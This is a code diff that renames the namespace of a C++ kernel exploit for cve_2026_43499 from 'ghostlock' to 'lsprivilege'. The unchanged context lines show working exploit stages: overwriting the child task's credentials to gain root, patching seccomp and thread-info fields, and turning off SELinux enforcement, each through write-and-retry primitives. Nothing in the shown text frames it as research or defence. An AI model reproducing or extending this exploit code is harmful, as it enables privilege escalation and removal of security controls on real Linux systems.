@@ -1,5 +1,5 @@
 /*
- * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
+ * LSPrivilege — cve_2026_43499 backend procedure (Batch 4, D1=B).
  *
  * The setup stage, the W1-W3 step sequence and the shared write/retry
  * primitives moved out of the retired ExploitProcedure. The middleware policy
@@ -34,7 +34,7 @@
 #include <string_view>
 #include <utility>
 
-namespace ghostlock::session::backend {
+namespace lsprivilege::session::backend {
     namespace {
         /* Shared write/retry sequence. */
         template <class M>
@@ -168,7 +168,7 @@ namespace ghostlock::session::backend {
                 if (vr_needed < 0) {
                     vr_needed = 1; /* /proc/modules unreadable: assume loaded */
                     if (FILE *m = fopen("/proc/modules", "r")) {
-                        auto close_modules = ghostlock::support::make_scope_exit(
+                        auto close_modules = lsprivilege::support::make_scope_exit(
                             [m]() noexcept { fclose(m); });
                         std::array<char, 256> mod{};
                         vr_needed = 0;
@@ -218,7 +218,7 @@ namespace ghostlock::session::backend {
 
             support::run_state::enter("w2a");
             Status got_root = retry_write_stage<M>(
-                session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
+                session, "W2: cred", child_task + lsprivilege::profile::task_cred_off(), 2,
                 g_exploit_session.profile.w2_attempts(),
                 g_exploit_session.profile.w2_settle_us(),
                 victim::verify_w2_stage, &w2_context, 0);
@@ -268,7 +268,7 @@ namespace ghostlock::session::backend {
             if (!exact_target) {
                 support::run_state::enter("w3a");
                 Status dir_ok = retry_write_stage<M>(
-                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
+                    session, "W3-0: leaf dir", child_task + lsprivilege::profile::task_comm_off(), 1, 4, 50000,
                     victim::verify_leaf_dir_stage, &w3_context, 1);
                 if (!dir_ok) {
                     /* U01/S14: upstream retires the child instead of guessing the leaf
@@ -287,8 +287,8 @@ namespace ghostlock::session::backend {
                                          ? child_task - 8
                                          : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
             uintptr_t mode_target = w3_context.leaf_to_target8
-                                        ? child_task + ghostlock::profile::task_seccomp_off() - 8
-                                        : child_task + ghostlock::profile::task_seccomp_off();
+                                        ? child_task + lsprivilege::profile::task_seccomp_off() - 8
+                                        : child_task + lsprivilege::profile::task_seccomp_off();
 
             uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
@@ -399,7 +399,7 @@ namespace ghostlock::session::backend {
                 selinux_ok = retry_write_stage<M>(
                     session,
                     "W1: SELinux",
-                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
+                    session.addresses.data_alias(lsprivilege::profile::selinux_enforcing()),
                     1, w1_attempts,
                     g_exploit_session.profile.w1_settle_us(),
                     victim::verify_selinux_stage, nullptr, 0);
@@ -561,4 +561,4 @@ namespace ghostlock::session::backend {
         ExploitSession &, const memory::WriteRequest &, const char *);
     template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
         ExploitSession &, const memory::WriteRequest &, const char *);
-} // namespace ghostlock::session::backend
+} // namespace lsprivilege::session::backend
